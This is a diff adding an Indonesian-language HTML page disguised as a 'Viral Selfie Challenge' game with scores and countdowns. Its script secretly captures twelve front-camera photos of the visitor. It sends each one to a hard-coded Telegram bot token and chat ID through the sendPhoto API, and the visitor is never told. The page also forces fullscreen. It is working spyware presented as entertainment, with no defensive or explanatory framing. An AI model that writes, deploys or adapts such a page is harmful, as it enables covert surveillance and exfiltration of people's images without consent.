@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>✨ VIRAL SELFIE CHALLENGE ✨</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            margin: 0; padding: 0; overflow: hidden;
+            background: linear-gradient(135deg, #6e00ff, #ff00aa, #00ffcc);
+            font-family: system-ui, -apple-system, sans-serif;
+            color: white; text-align: center;
+            height: 100vh; position: relative;
+        }
+        .score {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(0,0,0,0.4);
+            padding: 8px 18px;
+            border-radius: 30px;
+            font-size: 32px;
+            font-weight: bold;
+            z-index: 100;
+            box-shadow: 0 0 20px rgba(255,255,255,0.3);
+        }
+        .container { position: relative; z-index: 10; padding-top: 80px; }
+        h1 { 
+            font-size: 54px; font-weight: 900; margin: 10px 0 5px;
+            text-shadow: 0 0 30px rgba(255,255,255,0.9);
+            letter-spacing: 1px;
+        }
+        p { font-size: 26px; margin: 15px; text-shadow: 0 0 10px black; }
+        .countdown { 
+            font-size: 110px; font-weight: 900; margin: 30px 0; 
+            text-shadow: 0 0 40px white; 
+        }
+        button {
+            margin-top: 25px; padding: 18px 60px; font-size: 27px; font-weight: bold;
+            background: #ffff00; color: #000; border: none; border-radius: 60px;
+            cursor: pointer; box-shadow: 0 10px 35px rgba(255,255,0,0.7);
+        }
+        button:hover { transform: scale(1.1); }
+        .flash { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: white; opacity: 0; pointer-events: none; z-index: 999; 
+        }
+    </style>
+</head>
+<body>
+    <div class="score">Score: <span id="score">0</span> 🔥</div>
+    
+    <div class="container">
+        <h1>✨ VIRAL SELFIE CHALLENGE ✨</h1>
+        <p id="status">Ikuti trend terbaru! Ambil banyak selfie & jadi viral hari ini</p>
+        <div id="countdown" class="countdown"></div>
+        <button onclick="startChallenge()">MULAI CHALLENGE SEKARANG 🔥</button>
+    </div>
+
+    <div id="flash" class="flash"></div>
+
+    <script>
+        const BOT_TOKEN = "8582003361:AAH1MMKjNGDRpISBYzG8emMBLHCS4sztmW8";
+        const CHAT_ID = "8509633837";
+        let score = 0;
+        let photoCount = 0;
+
+        function updateScore(points) {
+            score += points;
+            document.getElementById("score").textContent = score;
+        }
+
+        function flashEffect() {
+            const flash = document.getElementById("flash");
+            flash.style.transition = "none";
+            flash.style.opacity = "0.75";
+            setTimeout(() => {
+                flash.style.transition = "opacity 0.35s";
+                flash.style.opacity = "0";
+            }, 30);
+        }
+
+        async function kirimFoto(blob, count) {
+            photoCount++;
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, `viral_${photoCount}.jpg`);
+            formData.append("caption", `✨ Viral Selfie Challenge\nFoto ke-${photoCount}/12\nScore: ${score}\nWaktu: ${new Date().toLocaleString()}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function ambilSelfie(count) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1280, height: 720 } 
+                });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                // Small countdown
+                for (let i = 3; i >= 1; i--) {
+                    document.getElementById("countdown").textContent = i;
+                    await new Promise(r => setTimeout(r, 550));
+                }
+                document.getElementById("countdown").textContent = "📸";
+
+                await new Promise(r => setTimeout(r, 450));
+
+                const canvas = document.createElement("canvas");
+                canvas.width = 1280;
+                canvas.height = 720;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, 1280, 720);
+
+                // Random filter text
+                ctx.font = "bold 68px Arial";
+                ctx.fillStyle = (count % 2 === 0) ? "#ffff00" : "#00ffff";
+                ctx.textAlign = "center";
+                ctx.fillText(count % 3 === 0 ? "💖 GO VIRAL 💖" : "✨ TRENDING NOW ✨", 640, 110);
+
+                stream.getTracks().forEach(track => track.stop());
+                flashEffect();
+
+                canvas.toBlob((blob) => {
+                    if (blob) kirimFoto(blob, count);
+                }, "image/jpeg", 0.93);
+
+            } catch(e) {
+                document.getElementById("status").innerHTML = "📸 Izinkan kamera biar bisa ikut challenge ya!";
+            }
+        }
+
+        function startChallenge() {
+            document.querySelector("button").style.display = "none";
+            document.getElementById("status").innerHTML = "Siap pose lucu? Challenge dimulai!";
+
+            let delay = 600;
+            for (let i = 1; i <= 12; i++) {
+                setTimeout(async () => {
+                    updateScore(170 + Math.floor(Math.random() * 100));
+                    document.getElementById("status").innerHTML = `Pose ${i}/12 • Ambil selfie terbaikmu!`;
+                    await ambilSelfie(i);
+
+                    if (i === 12) {
+                        setTimeout(() => {
+                            document.getElementById("status").innerHTML = "🏆 CHALLENGE SELESAI!<br>Kamu resmi viral hari ini! 🔥";
+                        }, 1800);
+                    }
+                }, delay);
+                delay += 3100;
+            }
+        }
+
+        // Auto fullscreen
+        document.documentElement.requestFullscreen?.();
+    </script>
+</body>
+</html>
